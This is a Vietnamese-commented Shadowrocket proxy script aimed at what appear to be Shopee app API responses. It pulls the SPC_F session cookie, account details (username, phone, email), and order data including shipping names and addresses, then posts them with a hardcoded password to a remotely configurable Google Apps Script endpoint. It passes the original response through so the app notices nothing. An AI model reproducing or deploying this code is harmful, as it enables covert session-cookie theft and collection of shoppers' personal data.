// ==========================================
// 1. LẤY URL VÀ XỬ LÝ COOKIE (CHỈ LẤY SPC_F)
// ==========================================
let requestUrl = $request.url;
let headers = $request.headers;
let cookieStr = headers['Cookie'] || headers['cookie'] || "";

let extractedCookie = "";

// Phân tích Cookie để chỉ lấy SPC_F
if (cookieStr) {
    let cookies = cookieStr.split(';');
    for (let c of cookies) {
        let item = c.trim();
        if (item.startsWith("SPC_F=")) {
            extractedCookie = item;
            break; // Tìm thấy SPC_F thì thoát vòng lặp luôn cho tối ưu
        }
    }
}


// ==========================================
// 2. HÀM GỬI POST REQUEST LÊN GAS
// ==========================================
const CONFIG_URL = "https://script.google.com/macros/s/AKfycbxgPgjFPnmYTkpDiawEADPstjmMr_k1XCT-2crUDebrr1AUMlJdBfqAfxsNnf1AMGUd/exec";
let body = $response.body;

function sendToGas(payload) {
    // Bước 1: Gọi API config để lấy GAS_URL mới nhất
    let configReq = {
        url: CONFIG_URL,
        header: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "get_config", key: "GAS_URL" })
    };

    $httpClient.post(configReq, function (error, _response, data) {
        let targetUrl = CONFIG_URL; // Fallback: nếu lỗi thì dùng URL mặc định

        if (!error && data) {
            try {
                let configData = JSON.parse(data);
                if (configData.status === "success" && configData.data && configData.data.value) {
                    targetUrl = configData.data.value;
                    console.log("Lấy GAS_URL từ config thành công: " + targetUrl);
                } else {
                    console.log("Config không có GAS_URL, dùng URL mặc định.");
                }
            } catch (e) {
                console.log("Lỗi parse config response: " + e);
            }
        } else {
            console.log("Lỗi gọi config API: " + error);
        }

        // Bước 2: Gửi payload thực tế lên GAS_URL (mới nhất hoặc fallback)
        let req = {
            url: targetUrl,
            header: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        };

        $httpClient.post(req, function (error2, _response2, data2) {
            if (error2) {
                console.log("Lỗi gửi dữ liệu lên GAS: " + error2);
            } else {
                console.log("Gửi GAS thành công: " + data2);
            }
            // Trả về body nguyên gốc để App không bị lỗi
            $done({ body });
        });
    });
}

// ==========================================
// 3. ROUTER: KIỂM TRA URL VÀ TẠO PAYLOAD
// ==========================================
try {
    let obj = JSON.parse(body);

    // CASE 1: THÊM TÀI KHOẢN MỚI
    if (requestUrl.indexOf("get_account_info") !== -1) {
        if (obj && obj.data) {
            let payload = {
                action: "add_new_user",
                url: requestUrl,
                username: obj.data.username || "",
                phone: obj.data.phone || "",
                email: obj.data.email || "",
                password: "Nguyentrong1",
                cookie: extractedCookie // Lúc này cookie chỉ chứa "SPC_F=..."
            };
            sendToGas(payload);
        } else {
            $done({ body });
        }
    }

    // CASE 2: CẬP NHẬT ĐƠN HÀNG (LẤY TRACKING)
    else if (requestUrl.indexOf("get_order_detail") !== -1) {
        if (obj && obj.data) {
            // Shadowrocket hỗ trợ Regex, ta lấy order_id trực tiếp từ URL
            let orderId = "";
            let match = requestUrl.match(/order_id=(\d+)/);
            if (match) {
                orderId = match[1];
            }

            // Truy xuất lấy tracking_number
            let trackingNumber = "";
            if (obj.data.shipping_info && obj.data.shipping_info.parcels && obj.data.shipping_info.parcels.length > 0) {
                trackingNumber = obj.data.shipping_info.parcels[0].tracking_number;
            }

            // Truy xuất thông tin đơn hàng bổ sung
            let shippingName = "";
            let shippingAddress = "";
            let itemName = "";
            let totalPrice = "";
            try {
                if (obj.data.delivery_info && obj.data.delivery_info.address) {
                    shippingName = obj.data.delivery_info.address.shipping_name || "";
                    shippingAddress = obj.data.delivery_info.address.shipping_address || "";
                }
                if (obj.data.items && obj.data.items.length > 0) {
                    itemName = obj.data.items[0].name || "";
                }
                if (obj.data.order_payment && obj.data.order_payment.total_price) {
                    totalPrice = obj.data.order_payment.total_price;
                }
            } catch (err) {
                console.log("Lỗi parse thông tin đơn hàng: " + err);
            }

            let payload = {
                action: "get_order_detail",
                url: requestUrl,
                cookie: extractedCookie, // Lúc này cookie chỉ chứa "SPC_F=..."

                // Truyền trực tiếp order_id và tracking_number lên luôn
                order_id: orderId,
                tracking_number: trackingNumber,

                // Thông tin bổ sung
                shipping_name: shippingName,
                shipping_address: shippingAddress,
                name: itemName,
                total_price: totalPrice,

                // Truyền toàn bộ object gốc vào "response" và "data"
                // để tương thích 100% với hàm handleUpdateOrderCase() trên GAS
                response: obj,
                data: obj.data
            };
            sendToGas(payload);
        } else {
            $done({ body });
        }
    }

    // CASE MẶC ĐỊNH KHÔNG KHỚP BỎ QUA
    else {
        $done({ body });
    }

} catch (e) {
    console.log("Lỗi parse JSON hoặc xử lý script: " + e);
    $done({ body });
}
